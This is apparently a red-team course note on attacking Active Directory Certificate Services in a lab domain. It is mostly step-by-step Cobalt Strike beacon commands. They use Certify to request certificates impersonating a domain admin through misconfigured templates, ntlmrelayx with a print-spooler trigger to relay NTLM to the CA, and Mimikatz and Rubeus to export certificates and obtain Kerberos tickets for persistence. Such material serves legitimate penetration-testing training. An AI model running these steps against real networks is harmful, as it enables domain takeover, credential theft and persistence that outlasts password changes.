# Active Directory Certificate Services

Active Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI).  This can provide public key cryptography, digital certificates, and digital signature capabilities.  Some practical applications include Secure/Multipurpose Internet Mail Extensions (S/MIME), secure wireless networks, VPN, Internet Protocol security (IPsec), Encrypting File System (EFS), smart card logon, and TLS. Correct implementation can improve the security of an organisation in confidentiality (encryption), integrity (digital signatures), and authentication (associate certificates with computer, user, or device accounts).

Misconfigurations can introduce exploitable security risks, like privilege escalation (even domain user to domain admin) and persistence. This module is derived from a research [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf).

## Finding Certificate Authorities

To find ADCS CAs in a domain or forest, run Certify with the cas parameter. This will output lots of useful information, including the root CA and subordinate CAs:

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

The Cert Chain is useful to note (e.g. ```CN=ca,DC=cyberbotic,DC=io -> CN=sub-ca,DC=dev,DC=cyberbotic,DC=io``` shows that "sub-ca" in the DEV domain is a subordinate of "ca" in the CYBER domain). The output also lists the certificate templates at each CA, as well as some information about which principals are allowed to manage them.

## Misconfigured Certificate Templates

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates. They are designed to be duplicated and configured for specific needs. Misconfigurations within these templates can lead to privilege escalation. Certify can also find vulnerable templates:

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

The following are some possible vulns:

* If ENROLLEE_SUPPLIES_SUBJECT is enabled, the certificate requestor can provide any SAN (subject alternative name).
* The certificate usage has Client Authentication set.
* DEV\Domain Users have enrollment rights, so any domain user may request a certificate.
* If an attacker controlled principal has WriteOwner, WriteDacl or WriteProperty.

If the configuration allows any domain user to request a cert for any other domain user (including a domain admin) and use it for authentication, do this:

1: Request a certificate for nlamb:

    beacon> getuid
    beacon> execute-assembly Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

2: Copy the whole certificate (both private key and cert) and save to cert.pem on Ubuntu. Then use openssl to convert to pfx format:

    ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

3: Convert cert.pfx into a base64 encoded string to use with Rubeus:

    ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

## NTLM Relaying to ADCS HTTP Endpoints

AD CS services support HTTP enrollment methods and even includes a GUI, usually found at http/s://<hostname>/certsrv.

If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks, e.g. coerce a DC to authenticate to an attacker-controlled location, relay the request to a CA to get a cert for that DC, and then use it to obtain a TGT.

Important: cannot relay NTLM authentication back to the originating machine. We therefore wouldn't be able to relay a DC to a CA if those services were running on the same machine. This is the case in the lab, as each CA is running on a DC.

Another good way to abuse this primitive is by gaining access to a machine configured for unconstrained delegation. In the lab already have access to WEB as jking, but this is another way of achieving the same end. Need:

* PortBender on Workstation 2 to capture traffic on 445 and redirect it to 8445
* A reverse port forward to forward traffic hitting port 8445 to the team server on port 445
* A SOCKS proxy for ntlmrelayx to send traffic back into the network

1: ntlmrelayx needs to target the certfnsh.asp page on the ADCS server:

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

2: Force the authentication to occur from WEB to WKSTN-2:

    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

The [S4U2Self](https://github.com/xenloops/Red_team_notes/blob/92f613464d685b265f6261a9e9cb6a752cf467c7/15_kerberos.md?plain=1#L152) trick can be used to obtain usable TGSs to move laterally to it.

## User & Computer Persistence

Certificates can be useful for maintaining persistence to users and computers since they tend to have a longer shelf-life then passwords (user certs are valid for an entire year by default, regardless of password changes).

Certificates only become invalid if they're revoked by the CA (or expire).  This also does not rely on any vulnerable templates.  We can extract certificates that have already been issued, or just request new ones.

### User Persistence

User certificates that have already been issued can be found in the user's Personal Certificate store (Console root\Certificates - Current user\Personal\Certificates). 

1: Enumerate certificates with Seatbelt. Check that "certificate is used for client authentication":

    beacon> getuid
    beacon> run hostname
    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

2: Export certs with Mimikatz using crypto::certificates (saves them to disk; View > Downloads in CS to download):

    beacon> mimikatz crypto::certificates /export
    beacon> download CURRENT_USER_My_0_Nina Lamb.pfx

3: Base64 encode the pfx file:

    ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

4: Use Rubeus to obtain a TGT (export password will be mimikatz) (requests RC4 tickets by default; force AES256 with ```/enctype:aes256```):

    beacon> execute-assembly Rubeus.exe asktgt /user:nlamb /certificate:MIINeg... /password:mimikatz /nowrap

If the user does not have a cert in their store request one with Certify:

    beacon> execute-assembly Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User

### Computer Persistence

The same can be applied to computer accounts, but must elevate to extract those certs:

    beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
    beacon> execute-assembly Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA... /password:mimikatz /nowrap

If requesting a machine certificate with Certify, use the /machine parameter to auto-elevate to SYSTEM and assume the identity of the computer account:

    beacon> execute-assembly Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine



